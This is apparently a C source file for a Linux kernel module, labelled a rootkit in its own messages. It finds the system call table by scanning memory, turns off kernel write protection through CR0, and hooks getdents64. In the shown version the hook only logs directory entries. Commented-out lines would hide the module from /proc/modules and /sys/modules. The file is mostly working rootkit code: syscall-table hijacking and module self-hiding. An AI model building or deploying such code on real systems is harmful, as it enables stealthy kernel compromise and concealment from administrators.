#include <linux/module.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/kobject.h>
#include <linux/unistd.h>
#include <linux/syscalls.h>
#include <linux/string.h>
#include <linux/slab.h>
#include <linux/dirent.h>


MODULE_LICENSE("Dual BSD/GPL");
int _init(void);
void _exit(void);
module_init(_init);
module_exit(_exit);

#if defined(__i386__)
#define START 0xc0000000
#define END 0xd0000000
typedef unsigned int my_type;
#else
#define START 0xffffffff81000000
#define END 0xffffffffa2000000
typedef unsigned long my_type;
#endif

my_type **find(void)
{
    my_type **table;
    my_type start = START;
    my_type end = END;
    while (start < end)
    {
        table = (my_type **) start;
        if (table[__NR_close] == (my_type *) sys_close)
            return &table[0];
        start += sizeof(void *);
    }
    return NULL;
}

asmlinkage int (*o_getdents64)(unsigned int fd, struct linux_dirent64 *dirp,
    unsigned int count);

asmlinkage int my_getdents64(unsigned int fd, struct linux_dirent64 *dirp,
    unsigned int count)
{
    int nread;
    int bpos;
    struct linux_dirent64 *d;
    nread = (*o_getdents64)(fd, dirp, count);
    if (nread > 0)
    {
        printk("--------------- nread=%d ---------------\n", nread);
        printk("i-node#  file type  d_reclen  d_off   d_name\n");
        for (bpos = 0; bpos < nread;)
        {
            d = (struct linux_dirent64 *) ((char *)dirp + bpos);
            printk("%llu  ", d->d_ino);
            printk("%-10s ", (d->d_type == DT_REG) ?  "regular" :
                             (d->d_type == DT_DIR) ?  "directory" :
                             (d->d_type == DT_FIFO) ? "FIFO" :
                             (d->d_type == DT_SOCK) ? "socket" :
                             (d->d_type == DT_LNK) ?  "symlink" :
                             (d->d_type == DT_BLK) ?  "block dev" :
                             (d->d_type == DT_CHR) ?  "char dev" : "???");
            printk("%4d %10lld  %s\n", d->d_reclen, (long long) d->d_off, (char *) d->d_name);
            bpos += d->d_reclen;
            if (d->d_ino == 0)
                break;
       }
    }
    return nread;
}

int _init(void)
{
    my_type* syscalltable = 0;
    printk("rootkit loaded\n");
    /*list_del_init(&__this_module.list);*/      /* /proc/modules */
    /*kobject_del(&THIS_MODULE->mkobj.kobj);*/   /* /sys/modules  */
    syscalltable = (my_type* ) find();
    if (syscalltable != 0)
    {
        write_cr0(read_cr0() & (~ 0x10000));
        o_getdents64 = (void *) xchg(&syscalltable[__NR_getdents64], my_getdents64);
        printk("rootkit replaced getdents64\n");
        write_cr0(read_cr0() | 0x10000);
    }
    return 0;
}

void _exit(void) {
    my_type* syscalltable = 0;
    syscalltable = (my_type* ) find();
    if (syscalltable != 0)
    {
        write_cr0(read_cr0() & (~ 0x10000));
        xchg(&syscalltable[__NR_getdents64], o_getdents64);
        write_cr0(read_cr0() | 0x10000);
    }
    printk("rootkit removed\n");
}
